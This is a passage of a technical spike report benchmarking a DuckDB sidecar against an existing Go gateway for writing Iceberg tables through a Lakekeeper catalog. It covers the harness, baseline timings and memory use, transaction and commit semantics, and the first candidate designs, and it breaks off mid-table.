# DuckDB-as-sidecar Spike Report

## Harness

Everything lives in `spikes/duckdb-sidecar/` (own Go module
`github.com/datuplet/datuplet/spikes/duckdb-sidecar`, go 1.25.7, stdlib only so far).

**Versions.** DuckDB CLI v2.0.0 (run with `-no-agent`); Lakekeeper
`quay.io/lakekeeper/catalog:v0.12.1`; `postgres:16`; silo
`docker.io/pgsty/silo:RELEASE.2026-10-26T00-00-00Z@sha256:7bb2aff6...30ad7`; Docker is OrbStack
(host networking). Authn disabled, so the catalog bearer token is any well-formed JWT.

**Fixture** (`fixture/env.sh` holds all ports/names; `fixture/up.sh` starts, `down.sh` removes):

| Container | Port (host net) | Notes |
|---|---|---|
| `spk-pg` | 55532 | Lakekeeper metadata DB |
| `spk-silo` | 59000 | S3 (`spk-bucket`), vended-STS endpoint `http://127.0.0.1:59000` |
| `spk-lk` | 58181 | catalog `http://127.0.0.1:58181/catalog`, warehouse `spk` (`s3-compat`, `sts-enabled`, `path-style-access`) |
| jsonsrv (not a container) | 58080 | `bin/jsonsrv` |

`fixture/up.sh` is idempotent and ends by running `fixture/bootstrap.sh` (Lakekeeper bootstrap +
warehouse, copied from `components/queryengine/integration_test.go`), which writes
`fixture/.state.env`: `LK_CATALOG_URL=http://127.0.0.1:58181/catalog`,
`LK_WAREHOUSE=00000000-0000-0000-0000-000000000000/spk`, `LK_PROJECT_ID=00000000-0000-0000-0000-000000000000`,
`S3_ENDPOINT=http://127.0.0.1:59000`. The project is Lakekeeper's default (nil-UUID) project, as in the
queryengine fixture; no extra project is created.

**Tools.**
- `measure/duck.sh [-ro] [cli flags] "<SQL>"`: DuckDB CLI with the catalog attached as `lk` (iceberg + httpfs,
  ICEBERG secret with the fake token, `ACCESS_DELEGATION_MODE 'vended_credentials'`, writable unless `-ro`).
- `measure/verify.sh <ns> <table>`: one JSON line: rows, snapshots + operations, summary total bytes, live data
  files, data bytes (S3 object sizes via `read_blob`), parquet codec / row groups of the first file, total row groups.
- `measure/run.sh <task> <config> <run-id> <label> -- <cmd...>`: wraps one process in `/usr/bin/time -l`
  (max RSS in bytes on macOS), appends one JSON line (wall_s from the harness, max_rss_bytes, peak_footprint_bytes,
  user_s, sys_s, cpu_s, exit, cmd) to `results/<task>/<config>.jsonl`. Concurrent processes of one run use
  the same run-id and different labels; the caller sums RSS per run-id.
- `cmd/jsonsrv -rows N -seed S -addr A`: `GET /records?$offset=&$limit=`, 12-field flat records, each a pure
  function of (seed, row index); streamed; `[]` past the end.

**Proof 1, write then verify (writable ATTACH with bearer token, vended creds, no S3 secret in the engine):**

```
$ measure/duck.sh "CREATE SCHEMA IF NOT EXISTS lk.probe; CREATE TABLE lk.probe.t AS SELECT 1 AS x;"
$ measure/verify.sh probe t
{"rows":1,"snapshots":1,"operations":["append"],"summary_total_bytes":"203","data_files":1,"data_bytes":203,
 "first_file":"s3://spk-bucket/01a191a2-.../data/01a191a2-8c75-....parquet","first_file_codec":"SNAPPY",
 "first_file_row_groups":1,"row_groups_total":1,"max_row_group_rows":1}
$ measure/verify.sh probe t2      # CREATE TABLE AS 1 row, then INSERT (2),(3)
{"rows":3,"snapshots":2,"operations":["append","append"],...,"data_files":2,"data_bytes":410,...,"row_groups_total":2}
```

**Proof 2, deterministic JSON server** (`go run ./cmd/jsonsrv -rows 200000`, page = 50 000 rows at offset 100 000, fetched twice):

```
8548dec694fc9aa7244af42558129e5a6067d50b652a22be520b56daac2c0e3e  -
8548dec694fc9aa7244af42558129e5a6067d50b652a22be520b56daac2c0e3e  -
```

Also checked: a 50 000-row page is 19.6 MB and takes 0.03 s; 12 fields per record; note null rate 29.8 %; text length 80-200;
20 categories; 6-char code; a page sliced from offset 0 equals the same rows fetched at their own offset; offset 250 000 returns `[]`.

**Notes for later tasks.**
- Row ids start at 0.
- `iceberg_snapshots()` / `iceberg_metadata()` need a string literal argument (`'lk."ns"."t"'`) on DuckDB 2.0;
  the bare identifier form prints a deprecation warning with ANSI escapes (`duck.sh` strips them).
- Lakekeeper's container log has audit events with `action_name` (`commit`, `create_table`, `get_metadata`, ...). It is not an
  HTTP access log, but `commit` events can be counted for the "REST commits" question (Q2a/Q2f); not yet checked for per-request detail.
- `max_rss_bytes` is the process (and waited children) from `time -l`; user/sys have 10 ms resolution.

## Baseline

Today's path, unmodified: `datuplet gateway` (sidecar) + `http-json-extractor` (component), both built
from the tree at `ecff5c5` with the plan's exact commands (`go build -o spikes/duckdb-sidecar/bin/datuplet
./cmd/datuplet`, `go build -C components/http-json-extractor -o $PWD/spikes/duckdb-sidecar/bin/http-json-extractor .`),
run on the host against the spike fixture. No platform code changed; the gateway booted with flags, env and
config only.

**Setup (what the operator does, reproduced on the host).** Source of truth:
`pkg/k8s/controllers/pipelinerun_jobs.go` (`buildComponentJob`, `generateGatewayConfig`, `buildGatewaySidecarEnv`).

- Gateway mode: `--minio` with `lakekeeper_url` set, i.e. **Lakekeeper mode** (no static backend, per-table
  vended STS creds, inline commit pool). Command:
  `env RUN_ID=<run> bin/datuplet gateway --minio --config <yaml> --addr 127.0.0.1:50061 --run-token-path <token>
  --pod-annotations-path <empty file>` (the cluster uses `:50051`; on this host 50051 is held by OrbStack, so gRPC
  is on 50061; the HTTP data plane is hard-wired to `:50052` because `runGateway` never sets `Config.HTTPAddr`).
- Config `spikes/duckdb-sidecar/baseline/gateway.yaml`: the shape `generateGatewayConfig` emits for
  `outputs: {default_bucket: raw, default_write_mode: APPEND}`: `mode: minio`, `run_id`, `output_buckets: [raw]`,
  `default_bucket: raw`, `default_write_mode: APPEND`, the `gateway:` block, `component.config`,
  `lakekeeper_url: http://127.0.0.1:58181/catalog`, `pipeline_api_jwks_url: http://127.0.0.1:58090/api/v1/auth/jwks.json`.
- Run token: `spikes/duckdb-sidecar/cmd/jwks-stub` (stdlib; `serve` = JWKS at `/api/v1/auth/jwks.json`, `mint` = RS256
  JWT, kid `spk-jwks-stub-1`) with `iss=datuplet-api`, `aud=datuplet-catalog`, `token_kind=run`, `sub=run_id=$RUN_ID`,
  `project_id=00000000-0000-0000-0000-000000000000`, `warehouse=spk` (the warehouse NAME; the gateway sends it as
  `warehouse` + `x-project-id`), `actor`, `iat/nbf=now`, `exp=now+24h`, one fresh `RUN_ID`/token per run. Boot log:
  `data gateway: run-token validated; routing to warehouse="spk" project_id="00000000-..."`. Lakekeeper authn is
  disabled, so the token is validated by the gateway only (all 8 checks), never by Lakekeeper.
- Extractor: `env DATUPLET_GATEWAY_ADDR=127.0.0.1:50061 RUN_ID=<run> bin/http-json-extractor` (the env the operator
  sets on the component container); its config comes from the gateway's `GetConfig`:
  `{url: http://127.0.0.1:58080/records, table_name: base_<cfg>_<run>, pagination: {type: offset, param: "$offset",
  size_param: "$limit", page_size: 50000, max_records: <rows>}}`, no `fields`, default (typed) schema inference,
  Arrow IPC writes, table resolved to bucket `raw` via `default_bucket`, write mode APPEND, fresh table per run.
- Effective gateway write settings (operator defaults, written explicitly in the config):
  `chunk_size` 32 MiB, `buffer_size` 64 MiB, `row_group_size` 64 MiB (= buffer), `target_file_size` 128 MiB;
  codec **ZSTD** (`buffer.DefaultBufferConfig`); async rotate queue 2, async upload 4 x 16 MiB buffers (env
  defaults, `DATUPLET_GATEWAY_ASYNC_*` unset); commit pool 4 workers / queue 256 (hard-coded); SDK writer batch
  1 MiB (`default_batch_size=1048576` in the extractor log). Gateway-inferred schema: 12 nullable columns
  (`amount:float64, category:string, code:string, created_at:string, flag:bool, id:int64, lat:float64, lon:float64,
  note:string, quantity:int64, text:string, uuid:string`).
- Observed file layout (what candidates are compared against file-for-file): row groups of **229 376 rows**
  (~65.3 MB uncompressed each, i.e. the 64 MiB buffer), files rotate at **~162 MB compressed / 7 row groups** (the
  rotation check `BytesWritten() >= target_file_size` runs after each row-group flush and overshoots 128 MiB by
  about one row group); last file smaller. L: 162 430 002 + 40 341 346 B; XL: 6 x ~162.4 MB + 37 716 335 B.

**Protocol.** `baseline/run.sh series <cfg> 3` = warm-up `w0` (discarded) + `r1..r3`; XL `baseline/run.sh one XL r1`.
Per run: start the gateway under `measure/run.sh` (label `gateway`), wait for `/health`, run the extractor under
`measure/run.sh` (label `extractor`), SIGTERM the gateway, then `measure/verify.sh raw <table>` and count Lakekeeper
audit events for the table. **Wall = the extractor process wall** (start → pages fetched → Commit barrier returned →
exit), with the sidecar already up, as with a K8s native sidecar; gateway boot (start → `/health` 200) is recorded
separately (0.11-0.29 s). RSS = `time -l` max RSS per process; summed = gateway + extractor (upper bound, peaks not
simultaneous). L/XL runs had a 10 s unmeasured settle before each run; S had none (added after S).
Host: Apple Silicon, 8 cores, 16 GiB, macOS 26.5.1; not idle (desktop apps + OrbStack VM; 1-min load average 2.6-4.2
before runs, recorded per run in `*.verify.jsonl`).

**Results** (median / min / max over r1-r3; MiB = 2^20 bytes):

| Dataset | Wall s (extractor) | Gateway RSS MiB | Extractor RSS MiB | Summed RSS MiB | Gateway CPU s | Extractor CPU s | Total CPU s |
|---|---|---|---|---|---|---|---|
| S (200 k) | 2.07 / 2.05 / 2.13 | 426.6 / 394.2 / 441.6 | 60.7 / 54.6 / 61.7 | 487.2 / 448.8 / 503.3 | 0.55 / 0.55 / 0.58 | 1.80 / 1.79 / 1.83 | 2.35 / 2.34 / 2.41 |
| L (2 M) | **19.09** / 19.02 / 19.29 | 586.1 / 526.6 / 589.7 | 65.5 / 64.8 / 65.8 | **651.6** / 591.3 / 655.5 | 4.44 / 4.44 / 4.52 | 18.04 / 18.00 / 18.04 | 22.48 / 22.48 / 22.52 |
| XL (10 M), 1 run | 94.85 | 594.7 | 66.8 | 661.5 | 21.80 | 90.46 | 112.26 |

Peak memory footprint (`time -l`), medians: S gateway 375.3 / extractor 48.9 MiB; L 551.1 / 54.5; XL 576.5 / 55.9.
XL summed RSS / L summed RSS = 661.5 / 651.6 = **1.02** (the baseline is memory-bounded).
Q4 bars derived from these: candidate L median wall ≤ 1.10 x 19.09 = **21.0 s**; summed RSS ≤ 1.25 x 651.6 = **814 MiB**.

**Tables** (`measure/verify.sh`, identical for every measured run of a dataset):

| Dataset | Rows | Data files | Data bytes | Snapshots (ops) | LK `commit` events | Codec | Row groups (max rows) |
|---|---|---|---|---|---|---|---|
| S | 200 000 | 1 | 20 504 167 | 1 (append) | 1 | ZSTD | 1 (200 000) |
| L | 2 000 000 | 2 | 202 771 348 | 1 (append) | 1 | ZSTD | 9 (229 376) |
| XL | 10 000 000 | 7 | 1 011 942 225 | 1 (append) | 1 | ZSTD | 44 (229 376) |

One snapshot per run, proven from `iceberg_snapshots()` (`snapshots: 1, operations: ["append"]`) and the Lakekeeper
audit log (exactly one `"action_name":"commit"` event on the table per run, plus one `create_table` on namespace `raw`).
Gateway log, L r1: `commit ok for raw.base_l_r1 (writer=w1): files=2 rows=2000000 snapshot=none→1430306896768944992
duration=74ms`. Snapshot summary carries the idempotency key and audit props: `datuplet.commit-key=8e0f22b3...,
datuplet.actor=spk-baseline, datuplet.run-id=spk-base-L-r1-1793445771, datuplet.run-mode=cluster,
datuplet.pipeline-api=datuplet-api, added-records=2000000`. The gateway also writes the `files.json` breadcrumb
(`.run-state/<RUN_ID>/files.json`) before the commit.

**Footprint (for Q5).** `bin/datuplet` 111 197 634 B (whole CLI; the gateway image builds the same `./cmd/datuplet`,
but `CGO_ENABLED=0` linux/alpine); `bin/http-json-extractor` 24 051 570 B. Gateway idle RSS ~47 MiB (`ps`, 5 s after
boot, input-table config, no reader open); boot to `/health` 0.11-0.29 s incl. JWKS fetch + token validation.

**R1: standalone gateway for Task 5.** `spikes/duckdb-sidecar/baseline/run.sh serve <config.yaml>` mints a fresh
`RUN_ID` + token, fills `__RUN_ID__` / `__LK_CATALOG_URL__` / `__JWKS_PORT__`, and execs the unmodified gateway in the
foreground (gRPC `127.0.0.1:50061`, HTTP `:50052`; client env `DATUPLET_GATEWAY_ADDR=127.0.0.1:50061`). Example
input-table config: `baseline/serve-input.example.yaml` (`input_buckets: [raw]`, `input_tables: [{bucket: raw,
table: base_l_r1}]`; `since_snapshot:` per table for incremental, or the SDK's `WithIncrementalSince`). Checked:
a throwaway SDK client (`OpenReader(raw, base_l_r1)`, Arrow IPC, outside the repo) read 2 000 000 rows, 12 columns,
489 chunks / 590 MB of IPC in 2.63 s against `serve`.

**Commands.**
```
cd spikes/duckdb-sidecar
go build -o bin/jwks-stub ./cmd/jwks-stub            # bin/jsonsrv from Task 1
baseline/run.sh series S 3      # w0 + r1..r3
baseline/run.sh series L 3
baseline/run.sh one XL r1
baseline/summarize.py           # medians/min/max + verify lines
```

**Raw files** (`spikes/duckdb-sidecar/results/`): `baseline/{S,L,XL}.jsonl` (measure/run.sh lines, labels `gateway`,
`extractor`), `baseline/{S,L,XL}.verify.jsonl` (verify.sh output + boot time + LK commit/create events + load average),
`baseline/logs/<cfg>-<run>.{gateway,extractor}.log`; Step 1 smoke runs (incl. two failed boots, see below) in
`baseline-smoke/`.

**Surprises / notes for candidates.**
- `measure/run.sh` assigns shell variables `RUN_ID`, `TASK`, `CONFIG`, `LABEL`; an inherited `RUN_ID` env is overwritten,
  which made the gateway fail check 8 (`run_id does not match operator-supplied RUN_ID env`). Pass env through
  `env VAR=... cmd` after `--` (exec keeps `time -l` on the real process).
- Port 50051 is taken on this host by OrbStack and invisible to `lsof` (use `nc -z`); the gateway's HTTP port 50052 is not
  configurable.
- The extractor, not the gateway, is the bottleneck: ~0.95 core of JSON decode for the whole run (L: 18.0 s CPU in 19.1 s
  wall) vs gateway 4.4 s CPU. The gateway dominates memory: ~590 MiB on L/XL with a 64 MiB buffer (Arrow batches +
  parquet encoder + 2-deep async rotate + 4 x 16 MiB upload buffers + Go GC headroom); the extractor stays at ~65 MiB.
- Files are ~162 MB, not 128 MiB, and row groups 229 376 rows; a candidate with DuckDB defaults (122 880-row row groups,
  its own file-size policy, different codec) must be reported next to these numbers.
- Host build is darwin/arm64 with cgo for the resolver only (no DuckDB linked); GOMAXPROCS = 8 (no pod CPU limit).

## Write semantics

Candidate core: `spikes/duckdb-sidecar/internal/engine` (duckdb-go/v2 v2.20000.0 = DuckDB 2.0.0, `-tags duckdb_arrow`,
CGO): in-memory DuckDB, `INSTALL/LOAD iceberg, httpfs` into `spikes/duckdb-sidecar/.ext`, `CREATE SECRET (TYPE ICEBERG,
TOKEN)`, `ATTACH '<project>/spk' AS lk (TYPE ICEBERG, URI, SECRET, ACCESS_DELEGATION_MODE 'vended_credentials')` **without
READ_ONLY**, optional `DROP SECRET` and query-worker lockdown (statements copied from `components/queryengine`). All
scenarios ran through `cmd/lkproxy` (logging reverse proxy, `127.0.0.1:58182` → Lakekeeper `:58181`; Lakekeeper's
`/v1/config` rewrites `uri` to the proxy, so every catalog call is logged). Every request of the session is in
`results/task3/lk-requests.jsonl` (22 472 lines); per-scenario excerpts `results/task3/<scn>.lk.jsonl` and tallies
`<scn>.lk-tally.txt` (`measure/lkslice.py`); verdict JSON `results/task3/<scn>.json` (each with `loadavg`);
`measure/verify.sh` of every table in `results/task3/verify.jsonl` (+ `verify-empty.jsonl` for 0-row tables, where
verify.sh fails on `parquet_metadata([])`). Paths below are relative to `spikes/duckdb-sidecar/`. Load average during the
scenarios 2.1-4.9 (1 min). These are functional results; no number here is a Q4 performance number.

| Q | Answer | One sentence | Evidence |
|---|---|---|---|
| Q1 | **Yes** | Writable ATTACH with a bearer works and data files are written with Lakekeeper-vended STS credentials (create/loadTable responses carry `s3.access-key-id/secret-access-key/session-token`; `duckdb_secrets()` holds only `lk_tok`, redacted); with the secret dropped after ATTACH, CREATE TABLE, INSERT, an INSERT after 20 s idle, the first load of a foreign table and CREATE SCHEMA all still work and the bearer is still sent (0 of 22 472 logged requests lack `Authorization`); only a re-ATTACH fails (`No ICEBERG secret by the name of 'lk_tok' could be found`); with the full lockdown on top, CTAS + a 200 000-row INSERT still work. | `results/task3/q1.json`, `q1.lk.jsonl`, `verify.jsonl` |
| Q2a | **Partly** | APPEND works and N INSERTs in one transaction are exactly **one** REST commit (`POST /v1/{prefix}/transactions/commit` with N `add-snapshot` updates), but each INSERT statement is its own snapshot + data file (5 INSERTs → 5 `append` snapshots, 5 files); autocommit → 5 commits; so "one snapshot per run" requires one INSERT statement per table per run; codec / row-group / file size are controllable by table properties (R3 below). | `results/task3/q2a.json`, `q2a.lk.jsonl`, `q2a-size.*` |
| Q2b | **Partly** | No single-snapshot replace exists: `CREATE OR REPLACE` → `Not implemented Error: CREATE OR REPLACE not supported in DuckDB-Iceberg. Please use separate Drop and Create Statements`, DROP+CREATE in one transaction → `Not implemented Error: Cannot create table deleted within a transaction`; `BEGIN; DELETE FROM t` (or `TRUNCATE t`)`; INSERT …; COMMIT` is atomic for readers (one REST commit; a concurrent reader loop saw only 200 000 or 150 000, never 0, over 988 and 923 counts) but writes **two** snapshots (`delete` + `append`) and a merge-on-read position-delete file over all old rows, leaving the old data file live (no `overwrite`, unlike the gateway's ReplaceDataFiles); the autocommit control (TRUNCATE, then INSERT) exposed an empty table 38 times. | `results/task3/q2b.json`, `q2b-drop-create.json`, `q2b.lk.jsonl` |
| Q2c | **Yes** | MERGE INTO (500 updates + 500 inserts) is correct on v2 and `format-version 3`, one REST commit, `overwrite` snapshot; merge-on-read only: v2 writes one parquet POSITION_DELETES file per DML, v3 writes Puffin deletion vectors and replaces the DV on the next DML (old DV `DELETED`, new one 510 positions); UPDATE and DELETE also work. | `results/task3/q2c.json`, `q2c.lk.jsonl` |
| Q2d | **Partly** | Two OS processes × 10 × 50 000-row INSERT commits, 5 runs: rows always equal 50 000 × successful commits and distinct ids equal rows (no loss, no duplicates); DuckDB retries 409s with a rebased parent (21 × 409 logged), but in run 1 one batch exhausted the default retries and failed (`Failed to commit Iceberg transaction: … (Conflict_409). message: CatalogCommit`, 950 000 rows), so the caller must retry; runs 2-5 (2 default, 2 with `commit.retry.num-retries=20`) had no failure, which does not prove the property helps. | `results/task3/q2d*.json`, `q2d.lk.jsonl` |
| Q2e | **No** (native) / Partly (workaround) | No SQL route writes snapshot-summary properties (summaries carry only standard keys; no function or setting for it), and DuckDB sends no `Idempotency-Key` header although Lakekeeper advertises `idempotency-key-lifetime: PT30M`; kill -9 right after COMMIT returned, then a naive rerun → 100 000 rows / 50 000 distinct ids (50 000 duplicates); workaround that works: `CALL set_iceberg_table_properties(t, {'datuplet.commit-key': K})` inside the same transaction rides in the same single commit, and a guarded rerun that checks the property skips (no new rows) — last-writer-wins, single writer per table, check-then-write not atomic. | `results/task3/q2e.json`, `q2e.lk.jsonl`, `q2e-iceberg-functions.json` |
| Q2f | **Yes** | One transaction over two tables is one `POST …/transactions/commit` with both table-changes; a commit-time failure of the second table (dropped concurrently → 404; concurrent append under a DELETE → 409, not retried) leaves the first table untouched (0 rows, 0 snapshots); a statement error in the second table aborts the transaction and `COMMIT` then returns **no error** but rolls back, so the caller must track statement errors itself. | `results/task3/q2f.json`, `q2f.lk.jsonl`, `verify-empty.jsonl` |
| Q2g | **Partly** | CTAS creates from data with source types; an extra column is rejected positionally (`has 12 columns but 13 values were supplied`) and BY NAME (`does not have a column with name "extra"`) — no auto-evolution, `ALTER TABLE … ADD COLUMN` then works; missing columns in BY NAME become NULL; a non-numeric string into BIGINT fails (`Conversion Error`) but implicit casts silently succeed ('42' → 42, 1.7 → 2 rounded, int/struct → VARCHAR) and BIGINT→VARCHAR ALTER is refused; declared columns (TIMESTAMPTZ, DECIMAL, LIST, STRUCT, MAP, UUID, BLOB) work, HUGEINT silently becomes decimal(38,0), NOT NULL persists (enforced by a fresh engine). | `results/task3/q2g.json`, `q2g.lk.jsonl`, `q2g-notnull-fresh.json` |
| Q2h | **Yes** | A zero-row INSERT (autocommit or in a transaction) returns success with no snapshot and no REST commit; a zero-row CTAS creates the table with 0 snapshots — the gateway's success-zero, but the sidecar must report "no new snapshot". | `results/task3/q2h.json`, `q2h.lk.jsonl`, `verify-empty.jsonl` |

**R3: codec, row-group and file size** (real L dataset, 2 000 000 rows read from `jsonsrv` by `read_json` with the
baseline's 12 column types, one INSERT per table, 1 run each, `results/task3/q2a-size.json`, `.verify.jsonl`, `.files.txt`):

| Table properties | Files | Bytes per file | Codec | Row groups (max rows) |
|---|---|---|---|---|
| DuckDB defaults (none) | 1 | 274 905 977 | SNAPPY | 6 (378 672) |
| `write.parquet.compression-codec=zstd` | 1 | 183 196 922 | ZSTD | 6 (378 672) |
| + `write.parquet.row-group-size=229376`, `write.target-file-size-bytes=134217728` | 2 | 147 672 891 + 35 603 660 | ZSTD | 7 + 2 (230 720) |
| + `write.parquet.row-group-size-bytes=67108864`, `write.target-file-size-bytes=134217728` | 2 | 138 831 371 + 44 513 942 | ZSTD | 8 + 4 (189 760) |
| *Baseline gateway (for comparison)* | 2 | 162 430 002 + 40 341 346 | ZSTD | 7 + 2 (229 376) |

- ZSTD works only as a **table property**; three forms are equivalent and verified: `CREATE TABLE … (cols) WITH
  ('write.parquet.compression-codec'='zstd')`, `CREATE TABLE … WITH (…) AS SELECT` (single commit: create + properties +
  snapshot), `ALTER TABLE … SET (…)` / `CALL set_iceberg_table_properties(…)` (one extra commit). No DuckDB setting exists;
  a namespace property is not inherited (`results/task3/q2a-ns-props.txt`: SNAPPY). A table the sidecar did not create
  (e.g. gateway-created, no property) gets SNAPPY unless the property is set.
- Row-group size is approximate (DuckDB's parallel writer rounds: 230 720 for 229 376); file rotation overshoots the
  target by about one row group, like the gateway. DuckDB's ZSTD files are 10 % smaller than the gateway's (183.3 vs
  202.8 MB) — different encoder settings, recorded so Task 4 compares like with like.
- The extension also honours (strings in the binary, not all exercised): `write.parquet.compression-level`,
  `write.parquet.page-size-bytes`, `write.parquet.dict-size-bytes`, `write.parquet.row-groups-per-file`,
  `write.parquet.target-file-size-bytes`, `commit.retry.*`, `write.delete.isolation-level`, `write.{delete,update,merge}.mode`
  (merge-on-read only).

**Other observations for Tasks 4-6.**
- CTAS = `POST …/tables` (stage-create) + `POST …/tables/<t>` (assert-create, schema, properties, first snapshot) — one
  commit. Every INSERT/MERGE/DELETE, even on one table, goes through `POST …/transactions/commit` with requirements
  `assert-current-schema-id`, `assert-table-uuid`, `assert-ref-snapshot-id`.
- Catalog chatter: every statement re-loads the table (`GET …/tables/<t>`, which also re-vends credentials): an
  autocommit INSERT costs 2-3 loads + 1 commit, and each autocommit `count(*)` ~2 loads (Q2b reader: 1 983 loads for 988 counts in ~3.3 s). A per-chunk INSERT design
  would multiply Lakekeeper load and snapshots.
- Vended credentials are refreshed implicitly on every table load; a single statement longer than the STS lifetime was
  not tested. Token validation and OpenFGA are not covered (Lakekeeper authn disabled).

**Commands** (from `spikes/duckdb-sidecar/`):
```
go build -o bin/lkproxy ./cmd/lkproxy
CGO_ENABLED=1 go build -tags duckdb_arrow -o bin/semantics ./cmd/semantics
bin/lkproxy -listen 127.0.0.1:58182 -upstream http://127.0.0.1:58181 -out results/task3/lk-requests.jsonl &
bin/jsonsrv -rows 2000000 &                         # for q2a-size and q2g
bin/semantics -scenario q1  > results/task3/q1.json  # likewise q2a q2a-size q2b q2c q2d q2e q2f q2g q2h
Q2B_ONLY=tx_drop_create bin/semantics -scenario q2b > results/task3/q2b-drop-create.json
Q2D_RETRIES=20 bin/semantics -scenario q2d > results/task3/q2d-retries20-r1.json
measure/lkslice.py results/task3/lk-requests.jsonl q2d > results/task3/q2d.lk.jsonl 2> results/task3/q2d.lk-tally.txt
measure/verify.sh t3 <table>; measure/files.sh t3 <table>     # per-file bytes / codec / row groups
```
The first `q2b` run had a SQL-templating bug (every replace statement failed to parse); `q2b.json` is the rerun and
`q2b.lk.jsonl` is sliced from the rerun's mark (`--since 2026-10-31T11:39:38.645255Z`).

## Footprint

Q5 idle/latency half (Ruling R2; binary and extension size is Task 4's). Each run is a fresh process
`bin/semantics -scenario q5-open` under `measure/run.sh task3 q5 <run> q5-open` (engine: threads 2, memory_limit 1 GiB,
warm `.ext`, ATTACH via lkproxy, secret dropped after ATTACH); it times each `engine.Open` phase, then reads its own RSS
(`ps`) right after ATTACH and after 5 s idle. w0 discarded, r1-r5 measured; load average 2.1-2.6.

| Metric (r1-r5) | Median | Min | Max |
|---|---|---|---|
| ATTACH-to-ready, `engine.Open` total | **78.3 ms** | 73.8 | 94.4 |
| — of which LOAD iceberg + httpfs | 57.7 ms | 53.6 | 63.9 |
| — open DB + settings | 14.7 ms | 13.8 | 24.4 |
| — CREATE SECRET / ATTACH (`/v1/config`) | 0.4 / 5.2 ms | — | — |
| First catalog listing after ATTACH | 15.0 ms | 13.0 | 19.1 |
| RSS right after ATTACH (`ps`) | 54.5 MiB | 52.1 | 55.7 |
| **Idle RSS 5 s after ATTACH** (`ps`) | **58.8 MiB** | 55.0 | 59.9 |
| Max RSS (`time -l`) | 58.9 MiB | 56.5 | 59.9 |

w0 (cold page cache): 201 ms (LOAD 100 ms, open 91 ms). First-ever INSTALL (download of iceberg, httpfs and avro into
`.ext`) took ~9.9 s; production images would pre-bake `.ext`.
Baseline for comparison: gateway idle RSS ~47 MiB; boot to `/health` 0.11-0.29 s including JWKS fetch + run-token
validation, which the candidate does not do yet. The candidate is ~12 MiB larger idle and readies in < 0.1 s.
Raw: `results/task3/q5.jsonl` (run.sh lines), `results/task3/q5-open.out.jsonl` (phase timings, RSS, loadavg per run).
For Task 4: `.ext/v2.0.0/osx_arm64` holds iceberg 43 836 366 B, avro 22 607 966 B (an iceberg dependency, auto-installed),
httpfs 19 679 534 B.

## Extraction performance

Q4, the maintainer's priority. Everything below is measured on the same host, fixture, `jsonsrv` records (seed 42,
50 000-row pages), catalog, storage and codec as `## Baseline`. Paths are relative to `spikes/duckdb-sidecar/`.

**Candidates** (`cmd/sidecar`, duckdb-go v2.20000.0 = DuckDB 2.0.0, `-tags duckdb_arrow`, on `internal/engine`; every
candidate table is created with the R3 properties `write.parquet.compression-codec=zstd`,
`write.parquet.row-group-size=229376`, `write.target-file-size-bytes=134217728`):

- **A — gateway contract unchanged.** `cmd/sidecar` (started from a copy of `cmd/mock-datagateway/main.go`; the gateway
  proto is copied into `internal/gwpb`) serves GetConfig, OpenWriter, WriteChunk, CloseWriter, Commit, Log, Shutdown and
  `POST /data/write/<id>`; the **unmodified `bin/http-json-extractor`** with the baseline's component config runs against
  it. Primary design (R5): the first Arrow IPC payload's schema creates `lk.raw.<t>` (CREATE TABLE … WITH (…)), then ONE
  streaming `INSERT INTO lk.raw.<t> SELECT * FROM <view>` runs for the writer's lifetime; the view is registered from an
  `array.RecordReader` (`internal/arrowchan`) that blocks on a channel (capacity 4 batches) fed by the HTTP handler, which
  answers as soon as the batch is queued (backpressure when full). CloseWriter closes the channel, the Commit RPC waits for
  the INSERT (autocommit = one snapshot) and returns per-table results (snapshot id, files, rows, bytes from
  `iceberg_snapshots()`). Statement errors are tracked by the sidecar: a failed INSERT fails the next HTTP write and the
  Commit RPC, and a transaction with a failed statement is rolled back, never COMMITted.
- **B — files in a shared directory.** `cmd/ndjson-client` fetches the same pages with Go `net/http`, writes each body
  verbatim (no JSON decoding in Go) to the shared directory, and calls `POST /ingest {output, files}` then `POST /commit`.
  The sidecar runs the templated `read_json([<shared-dir files>], format='array', columns={…the baseline's 12 types…})`.
  Best mode `stream`: the `read_json` result is pulled as Arrow on a second connection and pushed into the same channel
  view as A, so one INSERT per table per run; each page file is deleted after it was read.
- **C — Quack.** `cmd/quack-client` is a duckdb-go process with the quack extension that ATTACHes the sidecar
  (`quack_serve` on 127.0.0.1:58300, token, no TLS) and writes `q.lk.raw.<t>`; it fetches pages like B into a local file,
  parses them with its own `read_json` and streams the Arrow result into one `INSERT INTO q.lk.raw.<t> SELECT * FROM
  <channel view>` (the same `arrowchan` trick, client side).

**Does a Quack server expose its ATTACHed Iceberg catalog to Quack clients? Yes, with one server-side condition.** A plain
iceberg ATTACH on the server makes the client's `ATTACH 'quack:…'` fail: `Binder Error: Failed to bind remote table
lk.probe.t2 while attaching quack catalog "q": … Type with name UNKNOWN does not exist! … Quack ATTACH requires all remote
table definitions to bind on the client. For Iceberg tables listed with UNKNOWN column types, attach the Iceberg catalog on
the server with TABLE_RESOLUTION 'eager'.` With `TABLE_RESOLUTION 'eager'` on the server's ATTACH (`engine.Config.
AttachOptions`, added for this), the client sees every schema, reads `q.lk.raw.base_s_r1` (200 000 rows), creates
`q.lk.qprobe.t3 (…) WITH ('write.parquet.compression-codec'='zstd')` (ZSTD verified) and INSERTs into it (one `append`
snapshot). A table created on the server via `quack_query()` is not visible to an existing client attachment until its
catalog cache is refreshed. Cost of `eager`: the sidecar loads **every table of the warehouse** when it attaches — the
Step 1 C run (≈70 tables in the warehouse) made 66 table loads + 28 namespace GETs before the run's own requests
(`results/task4/step1/C.lk-tally.txt`), and the client binds every table at ATTACH (0.17-0.25 s here, ≈150 tables). This
grows with the warehouse and exposes all of it to the component (Task 6). Probe transcripts: `results/task4/probe/`.

### Step 1 — correctness (S, through `cmd/lkproxy`)

One S run per candidate with the sidecar's catalog URI on the logging proxy (`results/task4/step1/`): rows 200 000, one
`append` snapshot, one data file, ZSTD, for A, B and C. Lakekeeper requests per run (`<c>.lk-tally.txt`): A and B each
`POST …/tables` (stage-create) ×1, `POST …/tables/<t>` (commit-table: assert-create + the R3 properties, no snapshot) ×1,
`POST …/transactions/commit` (the data snapshot) ×1, `GET` table load ×3; C the same three writes plus the eager-resolution
loads above. So **one snapshot and one data commit per run, plus one create-commit**: the Lakekeeper audit log shows
**2 `commit` events per candidate table** vs the baseline's **1 `commit` + 1 `create_table`** (DuckDB creates tables
with stage-create + commit; the gateway does a plain create). Column types are identical to the baseline table
(`amount DOUBLE, category VARCHAR, code VARCHAR, created_at VARCHAR, flag BOOLEAN, id BIGINT, lat DOUBLE, lon DOUBLE,
